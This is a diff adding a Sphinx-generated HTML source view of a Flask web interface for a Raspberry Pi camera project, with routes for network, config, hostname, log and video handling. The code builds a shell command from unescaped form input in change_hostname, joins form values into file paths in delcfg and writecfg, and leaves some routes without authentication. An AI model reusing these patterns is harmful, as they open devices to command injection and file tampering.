+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/commit-ip&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="commit_ip_"><a class="viewcode-back" href="../webinterface.html#webinterface.commit_ip_">[docs]</a><span class="k">def</span> <span class="nf">commit_ip_</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">if</span> <span class="s2">&quot;ip-form-dynamic&quot;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
+                <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;ip-form-dynamic&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;on&quot;</span><span class="p">:</span>
+                    <span class="n">set_ip</span><span class="p">()</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="s2">&quot;fail&quot;</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-ipaddress&quot;</span><span class="p">])</span>
+                    <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-subnet&quot;</span><span class="p">])</span>
+                    <span class="n">socket</span><span class="o">.</span><span class="n">inet_aton</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-gateway&quot;</span><span class="p">])</span>
+                    <span class="c1"># currently this does nothing</span>
+                    <span class="k">return</span> <span class="s1">&#39;success&#39;</span>
+                    <span class="n">set_ip</span><span class="p">(</span><span class="n">ipaddress</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-ipaddress&quot;</span><span class="p">],</span>
+                           <span class="n">subnet</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-subnet&quot;</span><span class="p">],</span>
+                           <span class="n">gateway</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;ip-form-gateway&quot;</span><span class="p">])</span>
+                <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="s2">&quot;fail&quot;</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;fail&quot;</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/break_the_interface&#39;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="break_the_interface"><a class="viewcode-back" href="../webinterface.html#webinterface.break_the_interface">[docs]</a><span class="k">def</span> <span class="nf">break_the_interface</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;bljdg.html&quot;</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/delcfg&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="delcfg"><a class="viewcode-back" href="../webinterface.html#webinterface.delcfg">[docs]</a><span class="k">def</span> <span class="nf">delcfg</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;configs_byserial&quot;</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.ini&quot;</span><span class="p">))</span>
+            <span class="k">return</span> <span class="s2">&quot;success&quot;</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">&quot;FAILURE&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/writecfg&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="writecfg"><a class="viewcode-back" href="../webinterface.html#webinterface.writecfg">[docs]</a><span class="k">def</span> <span class="nf">writecfg</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="n">aconfig</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+        <span class="n">config_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;config-name&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.ini&quot;</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">config_name</span> <span class="o">==</span> <span class="s2">&quot;picam.ini&quot;</span><span class="p">:</span>
+            <span class="n">config_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;configs_byserial&quot;</span><span class="p">,</span> <span class="n">config_name</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">config_path</span> <span class="o">=</span> <span class="n">config_name</span>
+
+        <span class="n">aconfig</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">config_path</span><span class="p">)</span>
+        <span class="c1"># this is required because the default behaviour of checkboxes is that they do not trigger if they are unchecked.</span>
+        <span class="n">aconfig</span><span class="p">[</span><span class="s2">&quot;camera&quot;</span><span class="p">][</span><span class="s2">&quot;enabled&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;off&quot;</span>
+        <span class="n">aconfig</span><span class="p">[</span><span class="s2">&quot;ftp&quot;</span><span class="p">][</span><span class="s2">&quot;upload&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;off&quot;</span>
+        <span class="n">aconfig</span><span class="p">[</span><span class="s2">&quot;ftp&quot;</span><span class="p">][</span><span class="s2">&quot;replace&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;off&quot;</span>
+        <span class="n">aconfig</span><span class="p">[</span><span class="s2">&quot;ftp&quot;</span><span class="p">][</span><span class="s2">&quot;timestamp&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;off&quot;</span>
+        <span class="k">for</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">items</span><span class="p">(</span><span class="n">multi</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+            <span class="c1"># print&quot;key:&quot; + key +&quot;  value:&quot;+value</span>
+            <span class="k">if</span> <span class="n">value</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span> <span class="ow">and</span> <span class="n">key</span> <span class="o">!=</span> <span class="s2">&quot;config-name&quot;</span><span class="p">:</span>
+                <span class="n">sect</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="n">opt</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+                <span class="n">aconfig</span><span class="p">[</span><span class="n">sect</span><span class="p">][</span><span class="n">opt</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
+                <span class="c1"># print(&quot;changed: &quot; + sect + &#39;:&#39; + opt + &#39;:&#39; + value)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">sanitizeconfig</span><span class="p">(</span><span class="n">aconfig</span><span class="p">,</span> <span class="n">config_path</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s2">&quot;success&quot;</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/change_hostname&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="change_hostname"><a class="viewcode-back" href="../webinterface.html#webinterface.change_hostname">[docs]</a><span class="k">def</span> <span class="nf">change_hostname</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;hostname&#39;</span><span class="p">]:</span>
+            <span class="n">hostname</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;hostname&#39;</span><span class="p">]</span>
+            <span class="n">config</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+            <span class="n">config_path</span> <span class="o">=</span> <span class="s2">&quot;eyepi.ini&quot;</span>
+            <span class="n">config</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">config_path</span><span class="p">)</span>
+            <span class="n">config</span><span class="p">[</span><span class="s2">&quot;camera&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">hostname</span>
+            <span class="n">pi_config</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+            <span class="n">pi_config_path</span> <span class="o">=</span> <span class="s2">&quot;picam.ini&quot;</span>
+            <span class="n">pi_config</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">config_path</span><span class="p">)</span>
+            <span class="n">pi_config</span><span class="p">[</span><span class="s2">&quot;camera&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">hostname</span> <span class="o">+</span> <span class="s2">&quot;-Picam&quot;</span>
+            <span class="n">hostsfilestring</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;#</span>
+<span class="s2"># /etc/hosts: static lookup table for host names</span>
+<span class="s2">#</span>
+
+<span class="s2">#&lt;ip-address&gt;	&lt;hostname.domain.org&gt;	&lt;hostname&gt;</span>
+<span class="s2">127.0.0.1	localhost.localdomain	localhost CHANGE</span>
+<span class="s2">::1		localhost.localdomain	localhost CHANGE</span>
+
+<span class="s2"># End of file</span>
+<span class="s2">&quot;&quot;&quot;</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/etc/hosts&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">hostsfile</span><span class="p">:</span>
+                    <span class="n">hostsfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">hostsfilestring</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;CHANGE&quot;</span><span class="p">,</span> <span class="n">hostname</span><span class="p">))</span>
+
+                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/etc/hostname&quot;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">hostnamefile</span><span class="p">:</span>
+                    <span class="n">hostnamefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">hostname</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+                <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;hostname &quot;</span> <span class="o">+</span> <span class="n">hostname</span><span class="p">)</span>
+            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Something went horribly wrong&quot;</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">sanitizeconfig</span><span class="p">(</span><span class="n">config</span><span class="p">,</span> <span class="n">config_path</span><span class="p">)</span>
+            <span class="n">sanitizeconfig</span><span class="p">(</span><span class="n">pi_config</span><span class="p">,</span> <span class="n">pi_config_path</span><span class="p">)</span>
+            <span class="k">return</span> <span class="s2">&quot;success&quot;</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="config"><a class="viewcode-back" href="../webinterface.html#webinterface.config">[docs]</a><span class="k">def</span> <span class="nf">config</span><span class="p">():</span>
+    <span class="n">example</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+    <span class="n">rpiconfig</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+    <span class="n">example</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;example.ini&quot;</span><span class="p">)</span>
+    <span class="n">configs</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;configs_byserial&quot;</span><span class="p">,</span> <span class="s2">&quot;*.ini&quot;</span><span class="p">)):</span>
+        <span class="n">configs</span><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">file</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]]</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+        <span class="n">configs</span><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">file</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]]</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;config.html&quot;</span><span class="p">,</span> <span class="n">configs</span><span class="o">=</span><span class="n">configs</span><span class="p">,</span> <span class="n">example</span><span class="o">=</span><span class="n">example</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/filemanagement&#39;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="filemanagement"><a class="viewcode-back" href="../webinterface.html#webinterface.filemanagement">[docs]</a><span class="k">def</span> <span class="nf">filemanagement</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="s2">&quot;df -h&quot;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+    <span class="n">fsinfolines</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+    <span class="n">fsinfo</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">fsinfolines</span><span class="p">:</span>
+        <span class="n">fsinfo</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">())</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;filemgmt.html&quot;</span><span class="p">,</span> <span class="n">fsinfo</span><span class="o">=</span><span class="n">fsinfo</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/images&quot;</span><span class="p">)</span>
+<div class="viewcode-block" id="images"><a class="viewcode-back" href="../webinterface.html#webinterface.images">[docs]</a><span class="k">def</span> <span class="nf">images</span><span class="p">():</span>
+    <span class="n">example</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+    <span class="n">example</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&quot;example.ini&quot;</span><span class="p">)</span>
+
+    <span class="n">configs</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;configs_byserial&quot;</span><span class="p">,</span> <span class="s2">&quot;*.ini&quot;</span><span class="p">)):</span>
+        <span class="n">configs</span><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">file</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]]</span> <span class="o">=</span> <span class="n">ConfigParser</span><span class="p">()</span>
+        <span class="n">configs</span><span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">file</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]]</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
+    <span class="n">urls</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">glob</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">&quot;static&quot;</span><span class="p">,</span> <span class="s2">&quot;temp&quot;</span><span class="p">,</span> <span class="s2">&quot;*.jpg&quot;</span><span class="p">)):</span>
+        <span class="n">urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">file</span><span class="p">)[:</span><span class="o">-</span><span class="mi">4</span><span class="p">])</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;images.html&quot;</span><span class="p">,</span> <span class="n">configs</span><span class="o">=</span><span class="n">configs</span><span class="p">,</span> <span class="n">image_urls</span><span class="o">=</span><span class="n">urls</span><span class="p">,</span> <span class="n">example</span><span class="o">=</span><span class="n">example</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/getfilteredlog&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;POST&quot;</span><span class="p">])</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="getfilteredlog"><a class="viewcode-back" href="../webinterface.html#webinterface.getfilteredlog">[docs]</a><span class="k">def</span> <span class="nf">getfilteredlog</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+        <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;query&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+        <span class="n">returnstring</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;spc-eyepi.log&quot;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+            <span class="n">fsize</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">tell</span><span class="p">()</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="n">fsize</span> <span class="o">-</span> <span class="mf">10.24</span> <span class="o">**</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+            <span class="n">a</span> <span class="o">=</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">fnmatch</span><span class="o">.</span><span class="n">fnmatch</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">lower</span><span class="p">(),</span> <span class="s2">&quot;*&quot;</span> <span class="o">+</span> <span class="n">query</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&quot;*&quot;</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">returnstring</span><span class="o">.</span><span class="n">splitlines</span><span class="p">())</span> <span class="o">&lt;</span> <span class="mi">250</span><span class="p">:</span>
+                <span class="n">returnstring</span> <span class="o">+=</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> <span class="o">+</span> <span class="n">line</span> <span class="o">+</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+        <span class="n">returnstring</span> <span class="o">+=</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;h3&gt;Truncated at 250 lines of 1Mb into the past&lt;/h3&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>
+        <span class="k">return</span> <span class="n">returnstring</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/log/&lt;lt&gt;/&lt;lc&gt;&#39;</span><span class="p">)</span>
+<div class="viewcode-block" id="stream"><a class="viewcode-back" href="../webinterface.html#webinterface.stream">[docs]</a><span class="k">def</span> <span class="nf">stream</span><span class="p">(</span><span class="n">lt</span><span class="p">,</span> <span class="n">lc</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">generate</span><span class="p">():</span>
+        <span class="n">line</span> <span class="o">=</span> <span class="mi">1</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;spc-eyepi.log&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="s2">&quot;     &quot;</span>
+            <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+                <span class="k">if</span> <span class="n">line</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">lc</span><span class="p">):</span>
+                    <span class="k">break</span>
+                <span class="n">line</span> <span class="o">+=</span> <span class="mi">1</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+                <span class="k">if</span> <span class="n">lt</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+                    <span class="k">yield</span> <span class="n">r</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span>
+
+    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">generate</span><span class="p">(),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;text/plain&#39;</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/log.log&quot;</span><span class="p">)</span>
+<span class="nd">@requires_auth</span>
+<div class="viewcode-block" id="log"><a class="viewcode-back" href="../webinterface.html#webinterface.log">[docs]</a><span class="k">def</span> <span class="nf">log</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&quot;spc-eyepi.log&quot;</span><span class="p">)</span></div>
+
+
+<div class="viewcode-block" id="gen"><a class="viewcode-back" href="../webinterface.html#webinterface.gen">[docs]</a><span class="k">def</span> <span class="nf">gen</span><span class="p">(</span><span class="n">camera</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Video streaming generator function.&quot;&quot;&quot;</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="n">frame</span> <span class="o">=</span> <span class="n">camera</span><span class="o">.</span><span class="n">get_frame</span><span class="p">()</span>
+        <span class="k">yield</span> <span class="p">(</span><span class="n">b</span><span class="s1">&#39;--frame</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+               <span class="n">b</span><span class="s1">&#39;Content-Type: image/jpeg</span><span class="se">\r\n\r\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">frame</span> <span class="o">+</span> <span class="n">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/pi_feed&#39;</span><span class="p">)</span>
+<div class="viewcode-block" id="pi_feed"><a class="viewcode-back" href="../webinterface.html#webinterface.pi_feed">[docs]</a><span class="k">def</span> <span class="nf">pi_feed</span><span class="p">():</span>
+    <span class="sd">&quot;&quot;&quot;Video streaming route. Put this in the src attribute of an img tag.&quot;&quot;&quot;</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">cam</span> <span class="o">=</span> <span class="n">PiCamera</span><span class="p">(</span><span class="s2">&quot;asdfhjgasdkf&quot;</span><span class="p">,</span> <span class="n">noconf</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">gen</span><span class="p">(</span><span class="n">cam</span><span class="p">),</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;multipart/x-mixed-replace; boundary=frame&#39;</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;exception:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+        <span class="k">return</span> <span class="s2">&quot;&quot;</span></div>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/ivport_switch/&lt;int:cam_num&gt;&#39;</span><span class="p">)</span>
+<div class="viewcode-block" id="ivport_switch"><a class="viewcode-back" href="../webinterface.html#webinterface.ivport_switch">[docs]</a><span class="k">def</span> <span class="nf">ivport_switch</span><span class="p">(</span><span class="n">cam_num</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    switch the current ivport camera</span>
+<span class="sd">    :param cam_num:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    &quot;&quot;&quot;</span>
